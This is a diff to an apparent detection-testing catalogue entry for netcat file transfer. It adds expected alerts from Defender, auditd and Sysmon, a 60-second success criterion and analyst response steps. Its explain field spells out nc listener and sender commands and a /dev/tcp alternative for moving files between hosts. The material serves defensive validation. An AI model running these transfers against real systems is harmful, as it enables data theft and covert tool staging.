@@ -154,6 +154,34 @@
         "linux-audit",
         "sysmon"
       ]
+    },
+    "validation": {
+      "expected_events": [
+        {
+          "source": "defender-endpoint",
+          "description": "Netcat / Ncat - File Transfer - Sentinel"
+        },
+        {
+          "source": "linux-audit",
+          "description": "Netcat / Ncat - File Transfer (1) - Splunk"
+        },
+        {
+          "source": "sysmon",
+          "event_id": "3",
+          "description": "Network connection (Sysmon)"
+        },
+        {
+          "source": "sysmon",
+          "description": "proc_creation_netcat_file_transfer"
+        }
+      ],
+      "success_criteria": "At least one behavioral detection fires within 60 seconds of attack execution",
+      "response_steps": [
+        "Correlate alert with source host, user account, and timestamp",
+        "Review Microsoft Defender for Endpoint, Linux Audit (auditd), Sysmon for surrounding context (5 min before/after)",
+        "Verify whether the activity matches known administrative baselines or change windows",
+        "If confirmed malicious, isolate the host and escalate to incident response"
+      ]
     }
   },
   "explain": "Moves a file over a raw TCP socket with netcat when no HTTP/SMB is available:\n  nc -l -p 8000 > out.exe   receiver: listen on 8000 and write incoming bytes to a file\n  nc -q 0 <ip> 8000 < out.exe   sender: connect and stream the file, then quit on EOF (-q 0)\nStart the receiver first; the file transfers with no protocol overhead (cat < /dev/tcp/... can receive without any nc binary)."
